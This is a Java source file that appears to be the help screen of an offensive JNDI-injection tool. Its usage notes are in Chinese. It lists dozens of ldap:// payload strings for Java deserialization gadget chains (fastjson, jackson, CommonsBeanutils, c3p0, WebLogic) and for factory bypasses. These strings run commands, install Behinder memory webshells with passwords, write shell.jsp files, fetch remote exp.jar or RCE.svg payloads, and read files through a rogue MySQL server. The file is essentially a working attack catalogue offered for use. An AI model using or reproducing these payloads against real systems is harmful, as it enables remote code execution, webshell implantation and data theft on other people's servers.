package sonomon.jndi.main;


public class Help {
    public static  String ip = "127.0.0.1";
    public static  String port = "1389";

	public static void getHelp() {
		String jndi = "ldap://"+ip+":"+port;
		String payload1 = "tomcatecho/tomcatbehinder/weblogicecho/weblogicbehinder/springbehinder\r\n";
		String payload2 = "tomcatecho/tomcatbehinder/weblogicecho/springbehinder\r\n";
		String payload3 = "postgresqlbypass1/postgresqlbypass2/mysql5bypass/mysql8bypass/mysqlbypass/fabricbypass/oraclebypass1/oraclebypass2/db2bypass/sqlitebypass1/sqlitebypass2/derbybypass\r\n";
		String payload4 = "postgresqlbypass1/postgresqlbypass2/mysql5bypass/mysql8bypass/mysqlbypass/fabricbypass/oraclebypass1/oraclebypass2/db2bypass/sqlitebypass1\r\n";
		
    	System.out.print(""
    			+ "此程序尽量在jdk8-11上运行,在此基础上尽量保证启动该jar包的jdk环境与目标环境一致,否则可能会出现jdk自带类的serialVersionUID问题\r\n"
    			+ "如果在jdk7环境一部分payload无法生成(TextAndMnemonicHashMap)\r\n"
    			+ "如果在jdk17环境,可能会有强制模块化导致反射失效\r\n"
    			+ "使用Nashorn的少部分payload仅jdk8才能打成功,包括c3p095el/c3p092el/elbypass/h2bypass的weblogic相关payload\r\n"
    			+ "\r\n"
    			+ "可以带ip:port参数以执行jndi注入,请自行将class文件放入ip:port的web目录中以进行jndi注入\r\n"
    			+ "\r\n"
    			+ jndi + "/deser:urldns:dnslog.com\r\n"
    			+ "\r\n"
    			+ jndi + "/deser:fileread:1.ser[base64] // MS5zZXI=\r\n"
    			+ "\r\n"
    			+ jndi + "/deser:cb19:base64[calc] // Y2FsYw==\r\n"
    			+ jndi + "/deser:cb19:tomcatecho // header cmd: whoami\r\n"
    			+ jndi + "/deser:cb19:tomcatbehinder // /[*] pass:Hlfyztssns Referer: Jluw\r\n"
    			+ jndi + "/deser:cb19:weblogicecho // header cmd: whoami\r\n"
    			+ jndi + "/deser:cb19:weblogicbehinder // /[*] pass:rebeyond\r\n"
    			+ jndi + "/deser:cb19:springbehinder // /[*] pass:Aqrgiwolx Referer: Myonodjv 必须已存在接口\r\n"
    			+ jndi + "/deser:cb18:base64[calc]\r\n"
    			+ jndi + "/deser:cb110:base64[calc]\r\n"
    			+ "[*]cb all:"+payload1
    			+ "\r\n"
    			+ jndi + "/deser:cck1:base64[calc]\r\n"
    			+ jndi + "/deser:cck2:base64[calc]\r\n"
    			+ "[*]cck1 cck2:"+payload1
    			+ jndi + "/deser:cck3:base64[calc]\r\n"
    			+ jndi + "/deser:cck4:base64[calc]\r\n"
    			+ "\r\n"
    			+ jndi + "/deser:jdk7u21:base64[calc]\r\n"
    			+ "[*]jdk7u21:"+payload1
    			+ "\r\n"
    			+ jndi + "/deser:jre8u20:base64[calc]\r\n"
    			+ "[*]jre8u20:"+payload1
    			+ "\r\n"
    			+ jndi + "/deser:fastjson1:base64[calc] //BadAttributeValueExpException,jdk>1.7\r\n"
    			+ jndi + "/deser:fastjson2:base64[calc] // HotSwappableTargetSource(spring-aop),jdk>1.7\r\n"
    			+ jndi + "/deser:fastjson2_jdk7:base64[calc] // HotSwappableTargetSource(spring-aop),jdk<=1.7\r\n"
    			+ jndi + "/deser:fastjson3:base64[calc] // EventListenerList,serialVersionUID\r\n"
    			+ jndi + "/deser:fastjson4:base64[calc] // TextAndMnemonicHashMap,serialVersionUID \r\n"
    			+ "[*]fastjson all:"+payload1
    			+ "\r\n"
    			+ jndi + "/deser:jackson1:base64[calc] // >2.9.9,50%,BadAttributeValueExpException(jdk>1.7)\r\n"
    			+ jndi + "/deser:jackson1_100:base64[calc] // >2.9.9,JdkDynamicAopProxy(spring-aop),BadAttributeValueExpException(jdk>1.7)\r\n"
    			+ jndi + "/deser:jackson2:base64[calc] // >2.9.9,HotSwappableTargetSource/JdkDynamicAopProxy(spring-aop)\r\n"
    			+ jndi + "/deser:jackson3:base64[calc] // >2.9.9,50%,EventListenerList(serialVersionUID)\r\n"
    			+ jndi + "/deser:jackson3_100:base64[calc] // >2.9.9,JdkDynamicAopProxy(spring-aop),EventListenerList(serialVersionUID)\r\n"
    			+ jndi + "/deser:jackson4:base64[calc] // >2.9.9,50%,TextAndMnemonicHashMap(serialVersionUID)\r\n"
    			+ jndi + "/deser:jackson4_100:base64[calc] // >2.9.9,JdkDynamicAopProxy(spring-aop),TextAndMnemonicHashMap(serialVersionUID)\r\n"
    			+ "[*]jackson all:"+payload1
    			+ "\r\n"
    			+ jndi + "/deser:rome1:base64[calc] // <= 1.11.1 \r\n"
    			+ jndi + "/deser:rome1x:base64[calc] // = 1.0 \r\n"
    			+ jndi + "/deser:rome2:base64[calc] // <= 1.11.1 and jdk > 1.7 \r\n"
    			+ jndi + "/deser:rome2x:base64[calc] // = 1.0 and jdk > 1.7 \r\n"
    			+ jndi + "/deser:rome2_jdk7:base64[calc] // <= 1.11.1 and jdk <= 1.7 \r\n"
    			+ jndi + "/deser:rome2x_jdk7:base64[calc] // = 1.0 and jdk <= 1.7 \r\n"
    			+ "[*]rome all:"+payload1
    			+ "\r\n"
    			+ jndi + "/deser:c3p095:base64[http://127.0.0.1/exp]\r\n"
    			+ jndi + "/deser:c3p092:base64[http://127.0.0.1/exp]\r\n"
    			+ jndi + "/deser:c3p095el:base64[calc]\r\n"
    			+ jndi + "/deser:c3p092el:base64[calc]\r\n"
    			+ "[*]c3p0 el:"+payload2
    			+ "\r\n"
    			+ jndi + "/deser:bsh20b4:base64[calc]\r\n"
    			+ jndi + "/deser:bsh20b5:base64[calc]\r\n"
    			+ "\r\n"
    			+ jndi + "/deser:groovy23:base64[calc]\r\n"
    			+ jndi + "/deser:groovy24:base64[calc]\r\n"
    			+ "\r\n"
    			+ jndi + "/deser:ajw:base64[../ahi.txt:ahihihi]\r\n"
    			+ "\r\n"
    			+ jndi + "/deser:weblogic12:base64[calc] //CVE-2021-2135\r\n"
    			+ "\r\n"
    			+ jndi + "/deser:rhino:base64[calc] // serialVersionUID\r\n"
    			+ "[*]rhino:"+payload1
    			+ "\r\n"
    			+ jndi + "/deser:springaop21:base64[calc] // serialVersionUID\r\n"
    			+ jndi + "/deser:springaop22:base64[calc] // serialVersionUID\r\n"
    			+ "[*]springaop all:"+payload1
    			+ "\r\n"
    			+ jndi + "/BeanFactory:elbypass:base64[calc]\r\n"
    			+ "[*]elbypass:"+payload2
    			+ jndi + "/BeanFactory:bshbypass:base64[calc]\r\n"
    			+ "[*]bshbypass:"+payload2
    			+ jndi + "/BeanFactory:groovyclassloaderbypass:base64[calc]\r\n"
    			+ jndi + "/BeanFactory:groovyshellbypass:base64[calc]\r\n"
    			+ jndi + "/BeanFactory:yamlbypass:base64[http://127.0.0.1/exp.jar]\r\n"
    			+ jndi + "/BeanFactory:xsloaderbypass:base64[http://127.0.0.1/evil.xml]\r\n"
    			+ jndi + "/BeanFactory:xstreambypass:base64[calc]\r\n"
    			+ jndi + "/BeanFactory:mvelbypass:base64[calc]\r\n"
    			+ jndi + "/BeanFactory:libloaderbypass:base64[../../upload/exp]\r\n"
    			+ jndi + "/BeanFactory:configbypass:base64[http://127.0.0.1/exp.properties]\r\n"
    			+ jndi + "/BeanFactory:svgbypass:base64[http://127.0.0.1/RCE.svg]\r\n"
    			+ "\r\n"
    			
    			+ jndi + "/CommonsDbcp1Factory:h2bypass:base64[calc] //RCE\r\n"
    			+ "[*]h2bypass:"+payload2
    			+ jndi + "/CommonsDbcp1Factory:postgresqlbypass1:base64[../shell.jsp] //write file\r\n"
    			+ jndi + "/CommonsDbcp1Factory:postgresqlbypass2:base64[http://127.0.0.1/exp.xml] //load spring xml\r\n"
    			+ jndi + "/CommonsDbcp1Factory:mysql5bypass:base64[127.0.0.1:3306@root] //fake mysql read file\r\n"
    			+ jndi + "/CommonsDbcp1Factory:mysql8bypass:base64[127.0.0.1:3306@root] //fake mysql read file\r\n"
    			+ jndi + "/CommonsDbcp1Factory:mysqlbypass:base64[127.0.0.1:3306@root@123456@C://windows//win.ini] //true mysql read file\r\n"
    			+ jndi + "/CommonsDbcp1Factory:fabricbypass:base64[127.0.0.1:8080] //XXE\r\n"
    			+ jndi + "/CommonsDbcp1Factory:oraclebypass1:base64[127.0.0.1:1521] //get user\r\n"
    			+ jndi + "/CommonsDbcp1Factory:oraclebypass2:base64[1.xml] //XXE\r\n"
       			+ jndi + "/CommonsDbcp1Factory:db2bypass:base64[../webapps/ROOT/shell.jsp] or base64[qqq@shell.jsp] //write file\r\n"
       			+ jndi + "/CommonsDbcp1Factory:sqlitebypass1:base64[http://127.0.0.1/1.so] //RCE only linux\r\n"
       			+ jndi + "/CommonsDbcp1Factory:sqlitebypass2:base64[http://127.0.0.1/default.db@../webapps/ROOT/shell.jsp@3C256F75742E7072696E746C6E282248656C6C6F20776F726C6422293B253E] //write file\r\n"
       			+ "\r\n"
       			
    			+ jndi + "/CommonsDbcp2Factory:h2bypass:base64[calc]\r\n"
    			+ "[*]h2bypass:"+payload2
    			+ "[*]CommonsDbcp2Factory:"+payload3
    			+ "\r\n"
       			
    			+ jndi + "/TomcatDbcp1Factory:h2bypass:base64[calc]\r\n"
    			+ "[*]h2bypass:"+payload2
    			+ "[*]TomcatDbcp1Factory:"+payload3
    			+ "\r\n"
       			
    			+ jndi + "/TomcatDbcp2Factory:h2bypass:base64[calc]\r\n"
    			+ "[*]h2bypass:"+payload2
    			+ "[*]TomcatDbcp2Factory:"+payload3
    			+ "\r\n"
       			
				+ jndi + "/ResourceFactory:h2bypass:base64[calc]\r\n"
    			+ "[*]h2bypass:"+payload2
    			+ "[*]ResourceFactory:"+payload3
    			+ "\r\n"
    			
    			+ jndi + "/TomcatJdbcFactory:h2bypass:base64[calc]\r\n"
    			+ "[*]h2bypass:"+payload2
    			+ "[*]TomcatJdbcFactory:"+payload4
    			+ "\r\n"
       			
    			+ jndi + "/DruidFactory:h2bypass:base64[calc]\r\n"
    			+ "[*]h2bypass:"+payload2
    			+ "[*]DruidFactory:"+payload3
    			+ "\r\n"
       			
    			+ jndi + "/HikariJNDIFactory:h2bypass:base64[calc]\r\n"
    			+ "[*]h2bypass:"+payload2
    			+ "[*]HikariJNDIFactory:"+payload4
    			+ "\r\n"
    			
    			+ jndi + "/UserDatabaseFactory:xxebypass:base64[http://127.0.0.1:8080/evil.xml]\r\n"
    			+ jndi + "/UserDatabaseFactory:filebypass:base64[http://127.0.0.1:5000/../../webapps/ROOT/test.jsp]\r\n"

    			+ "\r\n"
    			+ jndi + "/GenericFactory:configbypass:base64[http://127.0.0.1/exp.properties]\r\n"
    			+ jndi + "/GenericFactory:svgbypass:base64[http://127.0.0.1/RCE.svg]\r\n"
    			
    			+ "\r\n"
    			+ jndi + "/JavaBeanObjectFactory:cb19:Y2FsYw== //c3p0, all deser\r\n"
    			+ jndi + "/JavaBeanObjectFactory:svgbypass:base64[http://127.0.0.1/RCE.svg]\r\n"
    			+ jndi + "/LdapCtxFactory:cb19:Y2FsYw== //all deser\r\n"
    			
    			+ "\r\n"
    			+ jndi + "/ServiceFactory:xxebypass:base64[http://127.0.0.1:8080/poc.wsdl]\r\n"
    			+ "\r\n"
    			+ "\r\n"
    			+ "");
	}
}
